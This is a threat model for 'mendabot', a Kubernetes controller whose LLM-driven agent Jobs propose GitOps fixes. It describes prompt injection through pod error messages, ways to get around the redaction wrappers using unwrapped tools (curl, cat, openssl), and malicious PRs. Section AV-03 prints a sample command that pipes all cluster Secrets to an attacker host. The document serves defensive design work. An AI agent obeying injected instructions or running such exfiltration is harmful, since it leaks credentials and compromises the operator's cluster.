# Threat Model: mendabot

**Version:** 1.1
**Date:** 2026-02-24
**Status:** Authoritative

This document is the single source of truth for mendabot's threat model. It is
input to every security review. If the architecture changes, update this document
before the next review.

---

## 1. System Description

mendabot is a Kubernetes controller that watches cluster resource failures, spawns
short-lived agent Jobs backed by an LLM (OpenCode), and opens pull requests on a
GitOps repository with proposed fixes.

**Two principals operate in the cluster:**

| Principal | Identity | Scope |
|-----------|----------|-------|
| mendabot-watcher | `ServiceAccount: mendabot-watcher` | Cluster-wide read of resources + pods/jobs in own namespace |
| mendabot-agent | `ServiceAccount: mendabot-agent` (or `mendabot-agent-ns`) | Cluster-wide read-only (default) or namespace-scoped read-only (opt-in) |

---

## 2. Assets Under Protection

| Asset | Where It Lives | Sensitivity |
|-------|----------------|-------------|
| GitHub App private key | `Secret/github-app` in `mendabot` namespace | CRITICAL — enables minting GitHub tokens for the target repo |
| LLM API key | `Secret/llm-credentials` in `mendabot` namespace | HIGH — enables LLM API usage at operator's cost |
| Kubernetes Secrets (all namespaces) | etcd cluster-wide | HIGH — may contain credentials for all workloads |
| GitOps repository | GitHub (external) | HIGH — controls what runs in the cluster |
| RemediationJob CRDs | etcd, `mendabot` namespace | MEDIUM — control what the agent investigates |
| Agent prompt template | `ConfigMap/opencode-prompt` | MEDIUM — controls agent behaviour |
| Finding error text | `RemediationJob.Spec.Finding.Errors` | MEDIUM — may contain credential fragments |
| Watcher logs | stdout/controller-runtime | MEDIUM — may contain redacted (but still identifiable) data |

---

## 3. Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│  CLUSTER BOUNDARY                                               │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  MENDABOT NAMESPACE (trusted)                            │  │
│  │                                                          │  │
│  │  mendabot-watcher Deployment                             │  │
│  │  RemediationJob CRDs                                     │  │
│  │  Secret/github-app         ← HIGH VALUE TARGET           │  │
│  │  Secret/llm-credentials    ← HIGH VALUE TARGET           │  │
│  │  ConfigMap/opencode-prompt ← controls agent behaviour    │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  AGENT JOB (semi-trusted — LLM-driven)                   │  │
│  │                                                          │  │
│  │  Reads: all cluster resources (RBAC-gated)               │  │
│  │  Writes: RemediationJob/status only (in-cluster)         │  │
│  │  Writes: GitHub PRs (external, via gh CLI)               │  │
│  │  Executes: arbitrary shell commands (LLM-directed)       │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  WORKLOAD NAMESPACES (untrusted input source)            │  │
│  │                                                          │  │
│  │  Pod error messages → Finding.Errors (attacker-writable) │  │
│  │  Node conditions, PVC events (partially attacker-writable│  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
└──────────────────────────────┬──────────────────────────────────┘
                               │ egress
              ┌────────────────▼────────────────────┐
              │  EXTERNAL (untrusted)               │
              │  GitHub API (target repo)           │
              │  LLM API (OpenAI-compatible)        │
              │  DNS                                │
              └─────────────────────────────────────┘
```

**Key trust boundaries:**
1. Cluster boundary — attacker outside the cluster cannot directly interact with mendabot
2. Namespace boundary — workload namespaces are untrusted input sources
3. Agent/watcher boundary — the agent is semi-trusted (LLM-driven; may be manipulated)
4. Init/main container boundary — init container has GitHub App key; main container must not
5. Cluster/external boundary — agent egress to GitHub and LLM APIs

---

## 4. Threat Actors

| Actor | Capability | Goal |
|-------|-----------|------|
| **External attacker** | No cluster access | Exploit public-facing surfaces; not directly applicable |
| **Malicious workload** | Can write pod error messages, node annotations | Inject prompt into FINDING_ERRORS to manipulate agent |
| **Compromised workload** | Has pod exec or shell access in a workload namespace | Read Secrets in own namespace; attempt lateral movement |
| **Compromised agent Job** | Has agent Job pod exec | Read all cluster Secrets; open malicious PRs; exfiltrate data |
| **LLM hallucination/confusion** | N/A (internal) | Execute unintended kubectl/gh commands; push harmful GitOps changes |
| **Supply chain attacker** | Can modify Dockerfile dependencies or Go deps | Inject malicious code into watcher or agent image |
| **Cluster admin (insider)** | Full cluster access | Out of scope — assumed trusted |

---

## 5. Attack Vectors (Prioritised)

### AV-01: Prompt Injection via Cluster State (CRITICAL risk)

**Entry point:** `pod.State.Waiting.Message`, `cond.Message`, PVC events, node conditions —
any field written by untrusted workload processes and read by native providers.

**Data flow:**
```
attacker controls pod → crafts Waiting.Message with LLM instructions
→ PodProvider.buildWaitingText() → Finding.Errors
→ domain.RedactSecrets() (may pass through)
→ RemediationJob.Spec.Finding.Errors
→ JobBuilder injects as FINDING_ERRORS env var
→ agent-entrypoint.sh substitutes into prompt
→ LLM receives crafted instructions alongside HARD RULES
→ if LLM ignores HARD RULES: malicious kubectl/gh commands executed
```

**Controls in place:** 500-char truncation, `domain.DetectInjection`, prompt envelope,
HARD RULE 8, `INJECTION_DETECTION_ACTION=suppress` option.

**Residual risk:** LLMs are not immune to sophisticated injection. Novel injection
techniques may bypass the heuristic detection patterns.

---

### AV-02: Credential Exposure via Error Text and Tool Call Output (HIGH risk)

**Entry point:** Error messages from pods, deployments, nodes. Also: raw stdout+stderr of
every tool call executed by the LLM agent via OpenCode's bash tool.

**Data flow (source path — controlled at ingestion):**
```
pod fails with message containing "DATABASE_URL=postgres://user:pass@host/db"
→ PodProvider extracts message → truncate(msg, 500) → domain.RedactSecrets()
→ if regex misses the pattern → stored in RemediationJob.Spec.Finding.Errors
→ readable by anyone with kubectl get remediationjob in mendabot namespace
→ injected as FINDING_ERRORS → appears in agent Job spec
→ readable by anyone with kubectl get/describe job in mendabot namespace
→ sent to LLM API (external service)
```

**Data flow (tool call output path — controlled at output by epic25):**
```
LLM directs: kubectl get secret <name> -o yaml
→ OpenCode: child_process.spawn("kubectl get secret ...", { shell: "bash" })
→ OS resolves "kubectl" via PATH → /usr/local/bin/kubectl (wrapper, not real binary)
→ wrapper calls kubectl.real, captures stdout+stderr into tmpfile
→ wrapper pipes tmpfile through /usr/local/bin/redact (cmd/redact binary)
→ redact applies domain.RedactSecrets → filters base64 values, tokens, PEM keys, etc.
→ filtered output returned to OpenCode → LLM context updated with redacted text
→ LLM context sent to external LLM API
```

**Controls in place:**

*Source path:*
- `domain.RedactSecrets` applied at all six native provider ingestion points
- 500-character truncation before redaction (limits exposure window)

*Tool call output path (epic25):*
- PATH-shadowing shell wrappers installed at `/usr/local/bin/<tool>` for all tools
  where raw output can contain credential material (see wrapper inventory below)
- Each wrapper calls the real binary (renamed to `<tool>.real`), captures combined
  stdout+stderr, pipes through `/usr/local/bin/redact`
- `cmd/redact` binary imports `internal/domain.RedactSecrets` directly — identical
  compiled regex patterns, zero pattern drift between source and output redaction
- Wrappers hard-fail (exit 1) if `redact` binary is absent, aborting the entrypoint
  visibly rather than passing raw output silently

**Wrapper inventory:**

| Tool | Wrapper | Real binary | Why wrapped |
|------|---------|-------------|-------------|
| `kubectl` | `/usr/local/bin/kubectl` | `/usr/local/bin/kubectl.real` | `get secret -o yaml` exposes base64-encoded Secret data values |
| `helm` | `/usr/local/bin/helm` | `/usr/local/bin/helm.real` | `helm get values` / `helm get secret` can expose Helm-managed secrets |
| `flux` | `/usr/local/bin/flux` | `/usr/local/bin/flux.real` | `flux get secret` exposes Git credentials and SOPS keys |
| `gh` | `/usr/local/bin/gh` | `/usr/bin/gh` (apt-installed, not renamed) | GitHub API responses can include `ghs_`/`ghp_` tokens |
| `sops` | `/usr/local/bin/sops` | `/usr/local/bin/sops.real` | `sops --decrypt` writes plaintext secrets to stdout |
| `talosctl` | `/usr/local/bin/talosctl` | `/usr/local/bin/talosctl.real` | Node credentials and machine configs contain key material |
| `yq` | `/usr/local/bin/yq` | `/usr/local/bin/yq.real` | YAML queries over secret-bearing manifests |
| `stern` | `/usr/local/bin/stern` | `/usr/local/bin/stern.real` | Log aggregation output can contain credentials printed by apps |
| `kubeconform` | `/usr/local/bin/kubeconform` | `/usr/local/bin/kubeconform.real` | Manifest validation echoes content including secret fields |
| `kustomize` | `/usr/local/bin/kustomize` | `/usr/local/bin/kustomize.real` | `kustomize build` renders manifests that may contain Secret data |
| `age` | `/usr/local/bin/age` | `/usr/local/bin/age.real` | `age --decrypt` writes decrypted plaintext to stdout |
| `age-keygen` | `/usr/local/bin/age-keygen` | `/usr/local/bin/age-keygen.real` | Prints generated private key to stdout |

**Tools deliberately NOT wrapped:**

| Tool | Reason not wrapped | Residual risk |
|------|-------------------|---------------|
| `curl` | Used in `get-github-app-token.sh` (init container) to call GitHub API — response body contains `ghs_...` token that must be captured by `TOKEN=$(curl ...)`. Wrapping would redact the token before the shell variable assignment, breaking the entire init container. | LLM can call `curl` against the Kubernetes API with the SA token and receive unredacted JSON responses. |
| `jq` | Pipes `curl` output through `.token` in `get-github-app-token.sh`. Wrapping would redact the extracted token before `TOKEN=$(...)` captures it. | LLM can use `jq` to extract and display credential fields from piped JSON. |
| `openssl` | Used in `get-github-app-token.sh` for `openssl dgst -sha256 -sign` which writes a raw binary DER signature to stdout. The `redact` base64 pattern would corrupt the binary signature, breaking JWT generation and preventing the init container from obtaining a GitHub App token. | LLM can call `openssl rsa`/`openssl pkey` to extract private key material to stdout. |
| `git` | Core workflow tool used extensively in remediation PRs (`git diff`, `git log`, `git show`). Wrapping output would break diff-based PR workflows that the agent uses for every remediation. | `git log`/`git diff`/`git show` can surface credentials embedded in commit history or diff content. Accepted as a workflow-critical trade-off. |
| `cat` | Used in `entrypoint-common.sh` to read SA token and prompt files; in `entrypoint-opencode.sh` to pass the rendered prompt to opencode. Wrapping would corrupt control-plane reads. | LLM can use `cat` to read any file in the container, including `/var/run/secrets/kubernetes.io/serviceaccount/token`. |
| `env` / `printenv` | `FINDING_ERRORS` is already redacted at source in all six native providers. Wrapping has marginal security value. High risk of breaking shell initialisation. | LLM can call `env` or `printenv` to list all environment variables; only `FINDING_ERRORS` is pre-redacted. Other env vars (e.g. `GIT_AUTHOR_EMAIL`) are non-sensitive. |

**Residual risk summary:**
- `curl`/`jq`/`openssl`/`cat` bypass: LLM can reach Kubernetes API or read container files directly using unwrapped tools
- `git` bypass: commit history and diffs may contain credential fragments
- Short secret values (< 30 raw bytes, < 40 base64 chars): not matched by the base64 pattern threshold; only caught if key name matches a named pattern (`password`, `token`, `secret`, `api-key`, `x-api-key`)
- Novel credential formats not covered by any existing regex pattern: pass through unredacted

---

### AV-03: Cluster Secret Exfiltration by Agent (HIGH risk)

**Entry point:** Agent Job pod — compromised by prompt injection (AV-01) or LLM error.

**Mechanism:**
```
agent Job runs with mendabot-agent ClusterRole
→ ClusterRole grants get/list/watch on ["*"]["*"] including Secrets
→ a prompt injection or LLM error causes:
    kubectl get secret -A -o yaml | curl https://attacker.com -d @-
→ all cluster Secrets exfiltrated
```

**Controls in place:** NetworkPolicy (opt-in, requires CNI); HARD RULE 2 (prompt-only);
namespace-scope opt-in (`AGENT_RBAC_SCOPE=namespace`).

**Residual risk:** NetworkPolicy requires compatible CNI and opt-in. Without it, egress
is unrestricted. HARD RULE 2 is a prompt instruction — not a technical control.

---

### AV-04: GitHub App Key Compromise (CRITICAL risk)

**Entry point:** `Secret/github-app` in `mendabot` namespace.

**Mechanism:**
```
attacker gains access to mendabot namespace (via compromised watcher pod,
compromised agent, or RBAC misconfiguration)
→ reads Secret/github-app → obtains GitHub App private key
→ mints arbitrary GitHub App installation tokens
→ can push to any repo the App is installed on
→ can open PRs, modify branches, access code
```

**Controls in place:** Secret is only mounted in agent init container (not main container);
init container exits before main container runs; no env var leakage to main container.

**Residual risk:** Any principal with `get` on the `github-app` Secret in the `mendabot`
namespace (including the agent itself, under default ClusterRole) can read it.

---

### AV-05: Malicious GitOps PR (HIGH risk)

**Entry point:** LLM output — the agent opens a PR.

**Mechanism:**
```
LLM (via hallucination or injection) generates a commit that:
- adds a new Secret with the attacker's SSH key
- modifies RBAC to grant privilege
- installs a backdoored image
→ if a human reviews and merges without scrutiny → cluster compromised
```

**Controls in place:** Branch protection on target repo (requires human review); HARD RULE 1
(no direct push to main); HARD RULE 2 (no Secret modification).

**Residual risk:** The control is entirely outside mendabot's codebase — it relies on
the target repo's branch protection configuration and human reviewer diligence.

---

### AV-06: Supply Chain Attack on Docker Image (HIGH risk)

**Entry point:** Dockerfile dependencies — curl downloads of kubectl, helm, flux, opencode,
and other binaries.

**Mechanism:**
```
attacker compromises download server or CDN
→ injects malicious binary in place of kubectl/helm/opencode
→ agent container runs malicious code with cluster access
```

**Controls in place:** SHA256 checksum verification for most binaries (kubectl, helm,
flux, talosctl, kustomize, yq, stern, age, sops, kubeconform).

**Residual risk:** `gh` CLI is installed via apt from GitHub's signed apt repo (no separate
checksum). `opencode` binary download uses GitHub releases — verify checksum coverage.

---

### AV-07: Dependency Confusion / Vulnerable Go Modules (MEDIUM risk)

**Entry point:** `go.mod` / `go.sum` — third-party dependencies pulled at build time.

**Mechanism:**
```
attacker publishes a malicious version of a dependency (e.g. controller-runtime fork)
→ watcher builds with it → privilege escalation or data exfiltration from watcher process
```

**Controls in place:** `go.sum` pins exact hashes; `govulncheck` in CI.

**Residual risk:** Known CVEs in transitive dependencies may not be caught immediately.

---

### AV-08: RBAC Over-Permission on Watcher (MEDIUM risk)

**Entry point:** `ClusterRole: mendabot-watcher`.

**Mechanism:**
```
watcher has create/update/patch on configmaps (cluster-wide via ClusterRole)
→ if watcher pod is compromised, attacker can modify ConfigMaps in any namespace
→ ConfigMaps are used by many workloads for configuration
→ potential for lateral movement via ConfigMap poisoning
```

**Controls in place:** ClusterRole is explicitly defined and reviewed.

**Residual risk:** ConfigMap write is broader than strictly necessary. The watcher only
needs to write ConfigMaps in its own namespace for circuit breaker state.

---

### AV-09: RemediationJob Spec Injection (MEDIUM risk)

**Entry point:** `RemediationJob.Spec.Finding.Errors` — written by the watcher, read by
the agent.

**Mechanism:**
```
attacker with write access to RemediationJob CRDs (e.g., a compromised watcher)
→ crafts a RemediationJob with malicious Finding.Errors
→ agent processes it as a legitimate finding
→ same outcome as AV-01 without needing to manipulate pod error messages
```

**Controls in place:** Only `mendabot-watcher` SA has create rights on `remediationjobs`.

**Residual risk:** If the watcher itself is compromised, this vector is open. No validation
of RemediationJob spec content on the agent side.

---

### AV-10: Token Written to Shared Volume (MEDIUM risk)

**Entry point:** `/workspace/github-token` — written by init container, read by main.

**Mechanism:**
```
the shared emptyDir volume is accessible to both containers
→ if a prompt injection causes the agent to: cat /workspace/github-token
→ token appears in LLM context → potentially logged or exfiltrated
→ token is valid for 1 hour after the agent starts
```

**Controls in place:** Token has 1-hour TTL; token is scoped to specific installation.

**Residual risk:** The design requires token sharing via file — this is unavoidable with
the current init container pattern. Token lifetime reduces but does not eliminate risk.

---

### AV-11: Agent Image Not Pinned (LOW risk)

**Entry point:** `AGENT_IMAGE` env var in watcher deployment.

**Mechanism:**
```
if AGENT_IMAGE is set to a mutable tag (e.g. :latest)
→ an updated image with malicious code is pushed to ghcr.io
→ next agent Job pull uses the new image
→ malicious code runs with cluster access
```

**Controls in place:** Image is operator-configured.

**Residual risk:** No enforcement in code that the image is pinned to a digest. Operators
using `:latest` or mutable tags are exposed.

---

### AV-12: Log Injection / Structured Log Pollution (LOW risk)

**Entry point:** Any field from `Finding.Errors` or pod names that reach the structured
logger.

**Mechanism:**
```
a crafted string containing newlines + JSON fragments is logged
→ log aggregation system (Loki/Elasticsearch) parses the injected JSON
→ false audit events are created
→ security monitoring is confused or bypassed
```

**Controls in place:** `go.uber.org/zap` encodes strings with proper escaping in
JSON output mode — newlines and quotes are escaped.

**Residual risk:** Low. Zap's JSON encoder is well-tested, but not formally verified.

---

## 6. Data Flow Security Analysis

### Highest-risk path: pod error message → LLM prompt

```
[UNTRUSTED]  pod Waiting.Message
                ↓
[PROVIDER]   buildWaitingText() — truncate(msg, 500)
                ↓
[REDACT]     domain.RedactSecrets() — regex patterns
                ↓
[DETECT]     domain.DetectInjection() — log or suppress
                ↓
[STORE]      RemediationJob.Spec.Finding.Errors — in etcd
                ↓
[BUILD]      JobBuilder.Build() — FINDING_ERRORS env var in Job spec
                ↓
[ENTRYPOINT] envsubst → /tmp/rendered-prompt.txt
                ↓
[LLM]        opencode run — LLM processes prompt
                ↓
[EXECUTE]    LLM directs: kubectl, gh, git commands
```

Each step is a control point. A failure at any step propagates to all downstream steps.

---

## 7. Assumptions and Constraints

| Assumption | Consequence if wrong |
|-----------|---------------------|
| etcd is not directly accessible by untrusted principals | RemediationJob specs are readable by anyone with etcd access |
| GitHub branch protection is configured on target repo | Agent can push directly to main |
| Cluster admin role is not abused (insider threat out of scope) | Entire model breaks |
| LLM API is operated by a trustworthy provider | LLM responses could be manipulated at the API level |
| NetworkPolicy CNI is deployed when using the security overlay | Network egress restriction is not enforced |
| Image registry (ghcr.io) is not compromised | Supply chain attack is possible |

---

## 8. Accepted Residual Risks (Current)

| ID | Risk | Severity | Acceptance Rationale |
|----|------|----------|---------------------|
| AR-01 | Agent can read all Secrets cluster-wide (default scope) | HIGH | Matches k8sgpt-operator permissions per HLD §11; namespace scope available as opt-in |
| AR-02 | Regex redaction has false negatives | MEDIUM | Best-effort; not a substitute for proper secret management |
| AR-03 | NetworkPolicy requires CNI — not enforced without it | MEDIUM | Operator responsibility; documented prerequisite |
| AR-04 | Prompt injection cannot be fully prevented | MEDIUM | Field-wide unsolved problem; layered mitigations reduce but cannot eliminate risk |
| AR-05 | GitHub token in shared emptyDir | MEDIUM | Required by init container pattern; 1-hour TTL limits exposure window |
| AR-06 | HARD RULEs are prompt instructions, not technical controls | MEDIUM | GitHub branch protection is the external technical control; human review required to merge |
